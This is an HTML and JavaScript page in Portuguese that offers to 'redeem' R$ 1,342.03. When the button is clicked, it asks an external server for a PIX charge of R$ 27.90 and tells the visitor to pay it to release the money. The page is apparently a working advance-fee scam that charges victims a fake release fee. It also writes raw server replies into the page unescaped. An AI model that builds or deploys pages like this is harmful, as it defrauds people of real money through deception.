<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">

<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }

.button-container {
    display: flex;
    justify-content: center;
    padding: 20px;
}

.btn-resgatar {
    background: #FF5F2C;
    color: white;
    border: none;
    width: 100%;
    max-width: 380px;
    padding: 25px 20px;
    font-size: 22px;
    font-weight: 900;
    border-radius: 12px;
    cursor: pointer;
}

.overlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9998;
}

.modal-pix {
    display: none;
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: white;
    padding: 30px;
    border-radius: 20px;
    z-index: 9999;
    text-align: center;
    width: 95%;
    max-width: 420px;
}

#debug {
    margin-top: 15px;
    font-size: 11px;
    text-align: left;
    max-height: 150px;
    overflow: auto;
    background: #f1f1f1;
    padding: 10px;
    border-radius: 8px;
}
</style>
</head>

<body>

<div class="button-container">
    <button id="btn_pagar" class="btn-resgatar" onclick="gerarPix()">
        RESGATAR R$ 1.342,03
    </button>
</div>

<div class="overlay" id="overlay"></div>

<div class="modal-pix" id="modal_pix">
    <h3 id="status_titulo">Status</h3>
    <p id="status_texto"></p>

    <div id="qr_code_div" style="margin:20px 0;"></div>

    <textarea id="txt_codigo"
        style="width:100%; height:60px; background:#f5f5f5;
        border:1px solid #ddd; border-radius:8px; padding:10px;
        font-size:12px;" readonly></textarea>

    <div id="debug"></div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script>

function logDebug(message) {
    document.getElementById("debug").innerHTML += message + "<br>";
}

function gerarPix() {

    const btn = document.getElementById("btn_pagar");
    btn.innerHTML = "PROCESSANDO...";
    btn.disabled = true;

    fetch("https://checkout-pix-profissional.onrender.com/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ valor: "27.90" })
    })
    .then(response => {
        logDebug("HTTP Status: " + response.status);
        return response.text();
    })
    .then(text => {

        logDebug("Resposta RAW:");
        logDebug(text);

        let data;

        try {
            data = JSON.parse(text);
            logDebug("JSON convertido com sucesso.");
        } catch (e) {
            logDebug("Erro ao converter JSON: " + e);
            document.getElementById("status_titulo").innerHTML = "Erro";
            document.getElementById("status_texto").innerHTML =
                "Servidor não retornou JSON válido.";
            abrirModal();
            return;
        }

        if (!data.payload) {
            logDebug("Payload não encontrado no JSON.");
            document.getElementById("status_titulo").innerHTML = "Erro";
            document.getElementById("status_texto").innerHTML =
                "Servidor não retornou o código PIX.";
            abrirModal();
            return;
        }

        abrirModal();

        document.getElementById("status_titulo").innerHTML =
            "✅ QR CODE GERADO";

        document.getElementById("status_texto").innerHTML =
            "Finalize o pagamento para liberar.";

        document.getElementById("txt_codigo").value = data.payload;

        const qrDiv = document.getElementById("qr_code_div");
        qrDiv.innerHTML = "";

        new QRCode(qrDiv, {
            text: data.payload,
            width: 200,
            height: 200
        });

    })
    .catch(error => {

        logDebug("Erro FETCH:");
        logDebug(error);

        document.getElementById("status_titulo").innerHTML = "Erro de conexão";
        document.getElementById("status_texto").innerHTML =
            "Não foi possível conectar ao servidor.";

        abrirModal();
    });
}

function abrirModal() {
    document.getElementById("overlay").style.display = "block";
    document.getElementById("modal_pix").style.display = "block";
}

</script>

</body>
</html>
